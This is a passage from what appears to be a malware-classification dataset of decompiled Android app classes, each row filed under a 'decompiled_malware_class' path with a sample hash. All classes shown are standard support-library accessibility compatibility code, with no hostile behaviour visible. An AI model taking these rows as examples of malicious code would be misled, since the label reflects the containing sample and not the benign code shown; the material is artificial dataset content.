z);   void setBoundsInParent(  Object obj,  Rect rect);   void setBoundsInScreen(  Object obj,  Rect rect);   void setCheckable(  Object obj,  boolean z);   void setChecked(  Object obj,  boolean z);   void setClassName(  Object obj,  CharSequence charSequence);   void setClickable(  Object obj,  boolean z);   void setContentDescription(  Object obj,  CharSequence charSequence);   void setEnabled(  Object obj,  boolean z);   void setFocusable(  Object obj,  boolean z);   void setFocused(  Object obj,  boolean z);   void setLiveRegion(  Object obj,  int i);   void setLongClickable(  Object obj,  boolean z);   void setMovementGranularities(  Object obj,  int i);   void setPackageName(  Object obj,  CharSequence charSequence);   void setParent(  Object obj,  View view);   void setParent(  Object obj,  View view,  int i);   void setPassword(  Object obj,  boolean z);   void setScrollable(  Object obj,  boolean z);   void setSelected(  Object obj,  boolean z);   void setSource(  Object obj,  View view);   void setSource(  Object obj,  View view,  int i);   void setText(  Object obj,  CharSequence charSequence);   void setViewIdResourceName(  Object obj,  String str);   void setVisibleToUser(  Object obj,  boolean z); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeInfoJellybeanImpl.code","static class AccessibilityNodeInfoJellybeanImpl extends AccessibilityNodeInfoIcsImpl {   AccessibilityNodeInfoJellybeanImpl(){   }   @Override public Object obtain(  View root,  int virtualDescendantId){     return AccessibilityNodeInfoCompatJellyBean.obtain(root,virtualDescendantId);   }   @Override public Object findFocus(  Object info,  int focus){     return AccessibilityNodeInfoCompatJellyBean.findFocus(info,focus);   }   @Override public Object focusSearch(  Object info,  int direction){     return AccessibilityNodeInfoCompatJellyBean.focusSearch(info,direction);   }   @Override public void addChild(  Object info,  View child,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.addChild(info,child,virtualDescendantId);   }   @Override public void setSource(  Object info,  View root,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.setSource(info,root,virtualDescendantId);   }   @Override public boolean isVisibleToUser(  Object info){     return AccessibilityNodeInfoCompatJellyBean.isVisibleToUser(info);   }   @Override public void setVisibleToUser(  Object info,  boolean visibleToUser){     AccessibilityNodeInfoCompatJellyBean.setVisibleToUser(info,visibleToUser);   }   @Override public boolean isAccessibilityFocused(  Object info){     return AccessibilityNodeInfoCompatJellyBean.isAccessibilityFocused(info);   }   @Override public void setAccessibilityFocused(  Object info,  boolean focused){     AccessibilityNodeInfoCompatJellyBean.setAccesibilityFocused(info,focused);   }   @Override public boolean performAction(  Object info,  int action,  Bundle arguments){     return AccessibilityNodeInfoCompatJellyBean.performAction(info,action,arguments);   }   @Override public void setMovementGranularities(  Object info,  int granularities){     AccessibilityNodeInfoCompatJellyBean.setMovementGranularities(info,granularities);   }   @Override public int getMovementGranularities(  Object info){     return AccessibilityNodeInfoCompatJellyBean.getMovementGranularities(info);   }   @Override public void setParent(  Object info,  View root,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.setParent(info,root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeInfoJellybeanMr2Impl.code","static class AccessibilityNodeInfoJellybeanMr2Impl extends AccessibilityNodeInfoJellybeanImpl {   AccessibilityNodeInfoJellybeanMr2Impl(){   }   @Override public String getViewIdResourceName(  Object info){     return AccessibilityNodeInfoCompatJellybeanMr2.getViewIdResourceName(info);   }   @Override public void setViewIdResourceName(  Object info,  String viewId){     AccessibilityNodeInfoCompatJellybeanMr2.setViewIdResourceName(info,viewId);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeInfoKitKatImpl.code","static class AccessibilityNodeInfoKitKatImpl extends AccessibilityNodeInfoJellybeanMr2Impl {   AccessibilityNodeInfoKitKatImpl(){   }   @Override public int getLiveRegion(  Object info){     return AccessibilityNodeInfoCompatKitKat.getLiveRegion(info);   }   @Override public void setLiveRegion(  Object info,  int mode){     AccessibilityNodeInfoCompatKitKat.setLiveRegion(info,mode);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeInfoStubImpl.code","static class AccessibilityNodeInfoStubImpl implements AccessibilityNodeInfoImpl {   AccessibilityNodeInfoStubImpl(){   }   @Override public Object obtain(){     return null;   }   @Override public Object obtain(  View source){     return null;   }   @Override public Object obtain(  View root,  int virtualDescendantId){     return null;   }   @Override public Object obtain(  Object info){     return null;   }   @Override public void addAction(  Object info,  int action){   }   @Override public void addChild(  Object info,  View child){   }   @Override public void addChild(  Object info,  View child,  int virtualDescendantId){   }   @Override public List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     return Collections.emptyList();   }   @Override public int getActions(  Object info){     return 0;   }   @Override public void getBoundsInParent(  Object info,  Rect outBounds){   }   @Override public void getBoundsInScreen(  Object info,  Rect outBounds){   }   @Override public Object getChild(  Object info,  int index){     return null;   }   @Override public int getChildCount(  Object info){     return 0;   }   @Override public CharSequence getClassName(  Object info){     return null;   }   @Override public CharSequence getContentDescription(  Object info){     return null;   }   @Override public CharSequence getPackageName(  Object info){     return null;   }   @Override public Object getParent(  Object info){     return null;   }   @Override public CharSequence getText(  Object info){     return null;   }   @Override public int getWindowId(  Object info){     return 0;   }   @Override public boolean isCheckable(  Object info){     return false;   }   @Override public boolean isChecked(  Object info){     return false;   }   @Override public boolean isClickable(  Object info){     return false;   }   @Override public boolean isEnabled(  Object info){     return false;   }   @Override public boolean isFocusable(  Object info){     return false;   }   @Override public boolean isFocused(  Object info){     return false;   }   @Override public boolean isVisibleToUser(  Object info){     return false;   }   @Override public boolean isAccessibilityFocused(  Object info){     return false;   }   @Override public boolean isLongClickable(  Object info){     return false;   }   @Override public boolean isPassword(  Object info){     return false;   }   @Override public boolean isScrollable(  Object info){     return false;   }   @Override public boolean isSelected(  Object info){     return false;   }   @Override public boolean performAction(  Object info,  int action){     return false;   }   @Override public boolean performAction(  Object info,  int action,  Bundle arguments){     return false;   }   @Override public void setMovementGranularities(  Object info,  int granularities){   }   @Override public int getMovementGranularities(  Object info){     return 0;   }   @Override public void setBoundsInParent(  Object info,  Rect bounds){   }   @Override public void setBoundsInScreen(  Object info,  Rect bounds){   }   @Override public void setCheckable(  Object info,  boolean checkable){   }   @Override public void setChecked(  Object info,  boolean checked){   }   @Override public void setClassName(  Object info,  CharSequence className){   }   @Override public void setClickable(  Object info,  boolean clickable){   }   @Override public void setContentDescription(  Object info,  CharSequence contentDescription){   }   @Override public void setEnabled(  Object info,  boolean enabled){   }   @Override public void setFocusable(  Object info,  boolean focusable){   }   @Override public void setFocused(  Object info,  boolean focused){   }   @Override public void setVisibleToUser(  Object info,  boolean visibleToUser){   }   @Override public void setAccessibilityFocused(  Object info,  boolean focused){   }   @Override public void setLongClickable(  Object info,  boolean longClickable){   }   @Override public void setPackageName(  Object info,  CharSequence packageName){   }   @Override public void setParent(  Object info,  View parent){   }   @Override public void setPassword(  Object info,  boolean password){   }   @Override public void setScrollable(  Object info,  boolean scrollable){   }   @Override public void setSelected(  Object info,  boolean selected){   }   @Override public void setSource(  Object info,  View source){   }   @Override public void setSource(  Object info,  View root,  int virtualDescendantId){   }   @Override public Object findFocus(  Object info,  int focus){     return null;   }   @Override public Object focusSearch(  Object info,  int direction){     return null;   }   @Override public void setText(  Object info,  CharSequence text){   }   @Override public void recycle(  Object info){   }   @Override public void setParent(  Object info,  View root,  int virtualDescendantId){   }   @Override public String getViewIdResourceName(  Object info){     return null;   }   @Override public void setViewIdResourceName(  Object info,  String viewId){   }   @Override public int getLiveRegion(  Object info){     return 0;   }   @Override public void setLiveRegion(  Object info,  int mode){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeProviderCompat.code","public class AccessibilityNodeProviderCompat {   private static final AccessibilityNodeProviderImpl IMPL;   private final Object mProvider; interface AccessibilityNodeProviderImpl {     Object newAccessibilityNodeProviderBridge(    AccessibilityNodeProviderCompat accessibilityNodeProviderCompat);   } static class AccessibilityNodeProviderStubImpl implements AccessibilityNodeProviderImpl {     AccessibilityNodeProviderStubImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    AccessibilityNodeProviderCompat compat){       return null;     }   } static class AccessibilityNodeProviderJellyBeanImpl extends AccessibilityNodeProviderStubImpl {     AccessibilityNodeProviderJellyBeanImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    final AccessibilityNodeProviderCompat compat){       return AccessibilityNodeProviderCompatJellyBean.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatJellyBean.AccessibilityNodeInfoBridge(){         @Override public boolean performAction(        int virtualViewId,        int action,        Bundle arguments){           return compat.performAction(virtualViewId,action,arguments);         }         @Override public List<Object> findAccessibilityNodeInfosByText(        String text,        int virtualViewId){           List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);           List<Object> infos=new ArrayList<>();           int infoCount=compatInfos.size();           for (int i=0; i < infoCount; i++) {             AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);             infos.add(infoCompat.getInfo());           }           return infos;         }         @Override public Object createAccessibilityNodeInfo(        int virtualViewId){           AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);           if (compatInfo == null) {             return null;           }           return compatInfo.getInfo();         }       } );     }   } static class AccessibilityNodeProviderKitKatImpl extends AccessibilityNodeProviderStubImpl {     AccessibilityNodeProviderKitKatImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    final AccessibilityNodeProviderCompat compat){       return AccessibilityNodeProviderCompatKitKat.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatKitKat.AccessibilityNodeInfoBridge(){         @Override public boolean performAction(        int virtualViewId,        int action,        Bundle arguments){           return compat.performAction(virtualViewId,action,arguments);         }         @Override public List<Object> findAccessibilityNodeInfosByText(        String text,        int virtualViewId){           List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);           List<Object> infos=new ArrayList<>();           int infoCount=compatInfos.size();           for (int i=0; i < infoCount; i++) {             AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);             infos.add(infoCompat.getInfo());           }           return infos;         }         @Override public Object createAccessibilityNodeInfo(        int virtualViewId){           AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);           if (compatInfo == null) {             return null;           }           return compatInfo.getInfo();         }         @Override public Object findFocus(        int focus){           AccessibilityNodeInfoCompat compatInfo=compat.findFocus(focus);           if (compatInfo == null) {             return null;           }           return compatInfo.getInfo();         }       } );     }   } static {     if (Build.VERSION.SDK_INT >= 19) {       IMPL=new AccessibilityNodeProviderKitKatImpl();     }  else     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityNodeProviderJellyBeanImpl();     }  else {       IMPL=new AccessibilityNodeProviderStubImpl();     }   }   public AccessibilityNodeProviderCompat(){     this.mProvider=IMPL.newAccessibilityNodeProviderBridge(this);   }   public AccessibilityNodeProviderCompat(  Object provider){     this.mProvider=provider;   }   public Object getProvider(){     return this.mProvider;   }   public AccessibilityNodeInfoCompat createAccessibilityNodeInfo(  int virtualViewId){     return null;   }   public boolean performAction(  int virtualViewId,  int action,  Bundle arguments){     return false;   }   public List<AccessibilityNodeInfoCompat> findAccessibilityNodeInfosByText(  String text,  int virtualViewId){     return null;   }   public AccessibilityNodeInfoCompat findFocus(  int focus){     return null;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeProviderCompatJellyBean.code","class AccessibilityNodeProviderCompatJellyBean { interface AccessibilityNodeInfoBridge {     Object createAccessibilityNodeInfo(    int i);     List<Object> findAccessibilityNodeInfosByText(    String str,    int i);     boolean performAction(    int i,    int i2,    Bundle bundle);   }   AccessibilityNodeProviderCompatJellyBean(){   }   public static Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeInfoBridge bridge){     return new AccessibilityNodeProvider(){       @Override public AccessibilityNodeInfo createAccessibilityNodeInfo(      int virtualViewId){         return (AccessibilityNodeInfo)AccessibilityNodeInfoBridge.this.createAccessibilityNodeInfo(virtualViewId);       }       @Override public List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         return AccessibilityNodeInfoBridge.this.findAccessibilityNodeInfosByText(text,virtualViewId);       }       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return AccessibilityNodeInfoBridge.this.performAction(virtualViewId,action,arguments);       }     } ;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeProviderCompatKitKat.code","class AccessibilityNodeProviderCompatKitKat { interface AccessibilityNodeInfoBridge {     Object createAccessibilityNodeInfo(    int i);     List<Object> findAccessibilityNodeInfosByText(    String str,    int i);     Object findFocus(    int i);     boolean performAction(    int i,    int i2,    Bundle bundle);   }   AccessibilityNodeProviderCompatKitKat(){   }   public static Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeInfoBridge bridge){     return new AccessibilityNodeProvider(){       @Override public AccessibilityNodeInfo createAccessibilityNodeInfo(      int virtualViewId){         return (AccessibilityNodeInfo)AccessibilityNodeInfoBridge.this.createAccessibilityNodeInfo(virtualViewId);       }       @Override public List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         return AccessibilityNodeInfoBridge.this.findAccessibilityNodeInfosByText(text,virtualViewId);       }       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return AccessibilityNodeInfoBridge.this.performAction(virtualViewId,action,arguments);       }       @Override public AccessibilityNodeInfo findFocus(      int focus){         return (AccessibilityNodeInfo)AccessibilityNodeInfoBridge.this.findFocus(focus);       }     } ;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeProviderImpl.code","interface AccessibilityNodeProviderImpl {   Object newAccessibilityNodeProviderBridge(  AccessibilityNodeProviderCompat accessibilityNodeProviderCompat); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeProviderJellyBeanImpl.code","static class AccessibilityNodeProviderJellyBeanImpl extends AccessibilityNodeProviderStubImpl {   AccessibilityNodeProviderJellyBeanImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeProviderCompat compat){     return AccessibilityNodeProviderCompatJellyBean.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatJellyBean.AccessibilityNodeInfoBridge(){       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return compat.performAction(virtualViewId,action,arguments);       }       @Override public List<Object> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);         List<Object> infos=new ArrayList<>();         int infoCount=compatInfos.size();         for (int i=0; i < infoCount; i++) {           AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);           infos.add(infoCompat.getInfo());         }         return infos;       }       @Override public Object createAccessibilityNodeInfo(      int virtualViewId){         AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);         if (compatInfo == null) {           return null;         }         return compatInfo.getInfo();       }     } );   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeProviderKitKatImpl.code","static class AccessibilityNodeProviderKitKatImpl extends AccessibilityNodeProviderStubImpl {   AccessibilityNodeProviderKitKatImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeProviderCompat compat){     return AccessibilityNodeProviderCompatKitKat.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatKitKat.AccessibilityNodeInfoBridge(){       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return compat.performAction(virtualViewId,action,arguments);       }       @Override public List<Object> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);         List<Object> infos=new ArrayList<>();         int infoCount=compatInfos.size();         for (int i=0; i < infoCount; i++) {           AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);           infos.add(infoCompat.getInfo());         }         return infos;       }       @Override public Object createAccessibilityNodeInfo(      int virtualViewId){         AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);         if (compatInfo == null) {           return null;         }         return compatInfo.getInfo();       }       @Override public Object findFocus(      int focus){         AccessibilityNodeInfoCompat compatInfo=compat.findFocus(focus);         if (compatInfo == null) {           return null;         }         return compatInfo.getInfo();       }     } );   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityNodeProviderStubImpl.code","static class AccessibilityNodeProviderStubImpl implements AccessibilityNodeProviderImpl {   AccessibilityNodeProviderStubImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  AccessibilityNodeProviderCompat compat){     return null;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view.accessibility\AccessibilityRecordCompat.code","public class AccessibilityRecordCompat {   private static final AccessibilityRecordImpl IMPL;   private final Object mRecord; interface AccessibilityRecordImpl {     int getAddedCount(    Object obj);     CharSequence getBeforeText(    Object obj);     CharSequence getClassName(    Object obj);     CharSequence getContentDescription(    Object obj);     int getCurrentItemIndex(    Object obj);     int getFromIndex(    Object obj);     int getItemCount(    Object obj);     int getMaxScrollX(    Object obj);     int getMaxScrollY(    Object obj);     Parcelable getParcelableData(    Object obj);     int getRemovedCount(    Object obj);     int getScrollX(    Object obj);     int getScrollY(    Object obj);     AccessibilityNodeInfoCompat getSource(    Object obj);     List<CharSequence> getText(    Object obj);     int getToIndex(    Object obj);     int getWindowId(    Object obj);     boolean isChecked(    Object obj);     boolean isEnabled(    Object obj);     boolean isFullScreen(    Object obj);     boolean isPassword(    Object obj);     boolean isScrollable(    Object obj);     Object obtain();     Object obtain(    Object obj);     void recycle(    Object obj);     void setAddedCount(    Object obj,    int i);     void setBeforeText(    Object obj,    CharSequence charSequence);     void setChecked(    Object obj,    boolean z);     void setClassName(    Object obj,    CharSequence charSequence);     void setContentDescription(    Object obj,    CharSequence charSequence);     void setCurrentItemIndex(    Object obj,    int i);     void setEnabled(    Object obj,    boolean z);     void setFromIndex(    Object obj,    int i);     void setFullScreen(    Object obj,    boolean z);     void setItemCount(    Object obj,    int i);     void setMaxScrollX(    Object obj,    int i);     void setMaxScrollY(    Object obj,    int i);     void setParcelableData(    Object obj,    Parcelable parcelable);     void setPassword(    Object obj,    boolean z);     void setRemovedCount(    Object obj,    int i);     void setScrollX(    Object obj,    int i);     void setScrollY(    Object obj,    int i);     void setScrollable(    Object obj,    boolean z);     void setSource(    Object obj,    View view);     void setSource(    Object obj,    View view,    int i);     void setToIndex(    Object obj,    int i);   } static class AccessibilityRecordStubImpl implements AccessibilityRecordImpl {     AccessibilityRecordStubImpl(){     }     @Override public Object obtain(){       return null;     }     @Override public Object obtain(    Object record){       return null;     }     @Override public int getAddedCount(    Object record){       return 0;     }     @Override public CharSequence getBeforeText(    Object record){       return null;     }     @Override public CharSequence getClassName(    Object record){       return null;     }     @Override public CharSequence getContentDescription(    Object record){       return null;     }     @Override public int getCurrentItemIndex(    Object record){       return 0;     }     @Override public int getFromIndex(    Object record){       return 0;     }     @Override public int getItemCount(    Object record){       return 0;     }     @Override public int getMaxScrollX(    Object record){       return 0;     }     @Override public int getMaxScrollY(    Object record){       return 0;     }     @Override public Parcelable getParcelableData(    Object record){       return null;     }     @Override public int getRemovedCount(    Object record){       return 0;     }     @Override public int getScrollX(    Object record){       return 0;     }     @Override public int getScrollY(    Object record){       return 0;     }     @Override public AccessibilityNodeInfoCompat getSource(    Object record){       return null;     }     @Override public List<CharSequence> getText(    Object record){       return Collections.emptyList();     }     @Override public int getToIndex(    Object record){       return 0;     }     @Override public int getWindowId(    Object record){       return 0;     }     @Override public boolean isChecked(    Object record){       return false;     }     @Override public boolean isEnabled(    Object record){       return false;     }     @Override public boolean isFullScreen(    Object record){       return false;     }     @Override public boolean isPassword(    Object record){       return false;     }     @Override public boolean isScrollable(    Object record){       return false;     }     @Override public void recycle(    Object record){     }     @Override public void setAddedCount(    Object record,    int addedCount){     }     @Override public void setBeforeText(    Object record,    CharSequence beforeText){     }     @Override public void setChecked(    Object record,    boolean isChecked){     }     @Override public void setClassName(    Object record,    CharSequence className){     }     @Override public void setContentDescription(    Object record,    CharSequence contentDescription){     }     @Override public void setCurrentItemIndex(    Object record,    int currentItemIndex){     }     @Override public void setEnabled(    Object record,    boolean isEnabled){     }     @Override public void setFromIndex(    Object record,    int fromIndex){     }     @Override public void setFullScreen(    Object record,    boolean isFullScreen){     }     @Override public void setItemCount(    Object record,    int itemCount){     }     @Override public void setMaxScrollX(    Object record,    int maxScrollX){     }     @Override public void setMaxScrollY(    Object record,    int maxScrollY){     }     @Override public void setParcelableData(    Object record,    Parcelable parcelableData){     }     @Override public void setPassword(    Object record,    boolean isPassword){     }     @Override public void setRemovedCount(    Object record,    int removedCount){     }     @Override public void setScrollX(    Object record,    int scrollX){     }     @Override public void setScrollY(    Object record,    int scrollY){     }     @Override public void setScrollable(    Object record,    boolean scrollable){     }     @Override public void setSource(    Object record,    View source){     }     @Override public void setSource(    Object record,    View root,    int virtualDescendantId){     }     @Override public void setToIndex(    Object record,    int toIndex){     }   } static class AccessibilityRecordIcsImpl extends AccessibilityRecordStubImpl {     AccessibilityRecordIcsImpl(){     }     @Override public Object obtain(){       return AccessibilityRecordCompatIcs.obtain();     }     @Override public Object obtain(    Object record){       return AccessibilityRecordCompatIcs.obtain(record);     }     @Override public int getAddedCount(    Object record){       return AccessibilityRecordCompatIcs.getAddedCount(record);     }     @Override public CharSequence getBeforeText(    Object record){       return AccessibilityRecordCompatIcs.getBeforeText(record);     }     @Override public CharSequence getClassName(    Object record){       return AccessibilityRecordCompatIcs.getClassName(record);     }     @Override public CharSequence getContentDescription(    Object record){       return AccessibilityRecordCompatIcs.getContentDescription(record);     }     @Override public int getCurrentItemIndex(    Object record){       return AccessibilityRecordCompatIcs.getCurrentItemIndex(record);     }     @Override public int getFromIndex(    Object record){       return AccessibilityRecordCompatIcs.getFromIndex(record);     }     @Override public int getItemCount(    Object record){       return AccessibilityRecordCompatIcs.getItemCount(record);     }     @Override public Parcelable getParcelableData(    Object record){       return AccessibilityRecordCompatIcs.getParcelableData(record);     }     @Override public int getRemovedCount(    Object record){       return AccessibilityRecordCompatIcs.getRemovedCount(record);     }     @Override public int getScrollX(    Object record){       return AccessibilityRecordCompatIcs.getScrollX(record);     }     @Override public int getScrollY(    Object record){       return AccessibilityRecordCompatIcs.getScrollY(record);     }     @Override public AccessibilityNodeInfoCompat getSource(    Object record){       return AccessibilityNodeInfoCompat.wrapNonNullInstance(AccessibilityRecordCompatIcs.getSource(record));     }     @Override public List<CharSequence> getText(    Object record){       return AccessibilityRecordCompatIcs.getText(record);     }     @Override public int getToIndex(    Object record){       return AccessibilityRecordCompatIcs.getToIndex(record);     }     @Override public int getWindowId(    Object record){       return AccessibilityRecordCompatIcs.getWindowId(record);     }     @Override public boolean isChecked(    Object record){       return AccessibilityRecordCompatIcs.isChecked(record);     }     @Override public boolean isEnabled(    Object record){       return AccessibilityRecordCompatIcs.isEnabled(record);     }     @Override public boolean isFullScreen(    Object record){       return AccessibilityRecordCompatIcs.isFullScreen(record);     }     @Override public boolean isPassword(    Object record){       return AccessibilityRecordCompatIcs.isPassword(record);     }     @Override public boolean isScrollable(    Object record){       return AccessibilityRecordCompatIcs.isScrollable(record);     }     @Override public void recycle(    Object record){       AccessibilityRecordCompatIcs.recycle(record);     }     @Override public void setAddedCount(    Object record,    int addedCount){       AccessibilityRecordCompatIcs.setAddedCount(record,addedCount);     }     @Override public void setBeforeText(    Object record,    CharSequence beforeText){       AccessibilityRecordCompatIcs.setBeforeText(record,beforeText);     }     @Override public void setChecked(    Object record,    boolean isChecked){       AccessibilityRecordCompatIcs.setChecked(record,isChecked);     }     @Override public void setClassName(    Object record,    CharSequence className){       AccessibilityRecordCompatIcs.setClassName(record,className);     }     @Override public void setContentDescription(    Object record,    CharSequence contentDescription){       AccessibilityRecordCompatIcs.setContentDescription(record,contentDescription);     }     @Override public void setCurrentItemIndex(    Object record,    int currentItemIndex){       AccessibilityRecordCompatIcs.setCurrentItemIndex(record,currentItemIndex);     }     @Override public void setEnabled(    Object record,    boolean isEnabled){       AccessibilityRecordCompatIcs.setEnabled(record,isEnabled);     }     @Override public void setFromIndex(    Object record,    int fromIndex){       AccessibilityRecordCompatIcs.setFromIndex(record,fromIndex);     }     @Override public void setFullScreen(    Object record,    boolean isFullScreen){       AccessibilityRecordCompatIcs.setFullScreen(record,isFullScreen);     }     @Override public void setItemCount(    Object record,    int itemCount){       AccessibilityRecordCompatIcs.setItemCount(record,itemCount);     }     @Override public void setParcelableData(    Object record,    Parcelable parcelableData){       AccessibilityRecordCompatIcs.setParcelableData(record,parcelableData);     }     @Override public void setPassword(    Object record,    boolean isPassword){       AccessibilityRecordCompatIcs.setPassword(record,isPassword);     }     @Override public void setRemovedCount(    Object record,    int removedCount){       AccessibilityRecordCompatIcs.setRemovedCount(record,removedCount);     }     @Override public void setScrollX(    Object record,    int scrollX){       AccessibilityRecordCompatIcs.setScrollX(record,scrollX);     }     @Override public void setScrollY(    Object record,    int scrollY){       AccessibilityRecordCompatIcs.setScrollY(record,scrollY);     }     @Override public void setScrollable(    Object record,    boolean scrollable){       AccessibilityRecordCompatIcs.setScrollable(record,scrollable);     }     @Override public void setSource(    Object record,    View source){       AccessibilityRecordCompatIcs.setSource(record,source);     }     @Override public void setToIndex(    Object record,    int toIndex){       AccessibilityRecordCompatIcs.setToIndex(record,toIndex);     }   } static class AccessibilityRecordIcsMr1Impl extends AccessibilityRecordIcsImpl {     AccessibilityRecordIcsMr1Impl(){     }     @Override public int getMaxScrollX(    Object record){       return AccessibilityRecordCompatIcsMr1.getMaxScrollX(record);     }     @Override public int getMaxScrollY(    Object record){       return AccessibilityRecordCompatIcsMr1.getMaxScrollY(record);     }     @Override public void setMaxScrollX(    Object record,    int maxScrollX){       AccessibilityRecordCompatIcsMr1.setMaxScrollX(record,maxScrollX);     }     @Override public void setMaxScrollY(    Object record,    int maxScrollY){       AccessibilityRecordCompatIcsMr1.setMaxScrollY(record,maxScrollY);     }   } static class AccessibilityRecordJellyBeanImpl extends AccessibilityRecordIcsMr1Impl {     AccessibilityRecordJellyBeanImpl(){     }     @Override public void setSource(    Object record,    View root,    int virtualDescendantId){       AccessibilityRecordCompatJellyBean.setSource(record,root,virtualDescendantId);     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityRecordJellyBeanImpl();       return;     }     if (Build.VERSION.SDK_INT >= 15) {       IMPL=new AccessibilityRecordIcsMr1Impl();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityRecordIcsImpl();     }  else {       IMPL=new AccessibilityRecordStubImpl();     }   }   public AccessibilityRecordCompat(  Object record){     this.mRecord=record;   }   public Object getImpl(){     return this.mRecord;   }   public static AccessibilityRecordCompat obtain(  AccessibilityRecordCompat record){     return new AccessibilityRecordCompat(IMPL.obtain(record.mRecord));   }   public static AccessibilityRecordCompat obtain(){     return new AccessibilityRecordCompat(IMPL.obtain());   }   public void setSource(  View source){     IMPL.setSource(this.mRecord,source);   }   public void setSource(  View root,  int virtualDescendantId){     IMPL.setSource(this.mRecord,root,virtualDescendantId);   }   public AccessibilityNodeInfoCompat getSource(){     return IMPL.getSource(this.mRecord);   }   public int getWindowId(){     return IMPL.getWindowId(this.mRecord);   }   public boolean isChecked(){     return IMPL.isChecked(this.mRecord);   }   public void setChecked(  boolean isChecked){     IMPL.setChecked(this.mRecord,isChecked);   }   public boolean isEnabled(){     return IMPL.isEnabled(this.mRecord);   }   public void setEnabled(  boolean isEnabled){     IMPL.setEnabled(this.mRecord,isEnabled);   }   public boolean isPassword(){     return IMPL.isPassword(this.mRecord);   }   public void setPassword(  boolean isPassword){     IMPL.setPassword(this.mRecord,isPassword);   }   public boolean isFullScreen(){     return IMPL.isFullScreen(this.mRecord);   }   public void setFullScreen(  boolean isFullScreen){     IMPL.setFullScreen(this.mRecord,isFullScreen);   }   public boolean isScrollable(){     return IMPL.isScrollable(this.mRecord);   }   public void setScrollable(  boolean scrollable){     IMPL.setScrollable(this.mRecord,scrollable);   }   public int getItemCount(){     return IMPL.getItemCount(this.mRecord);   }   public void setItemCount(  int itemCount){     IMPL.setItemCount(this.mRecord,itemCount);   }   public int getCurrentItemIndex(){     return IMPL.getCurrentItemIndex(this.mRecord);   }   public void setCurrentItemIndex(  int currentItemIndex){     IMPL.setCurrentItemIndex(this.mRecord,currentItemIndex);   }   public int getFromIndex(){     return 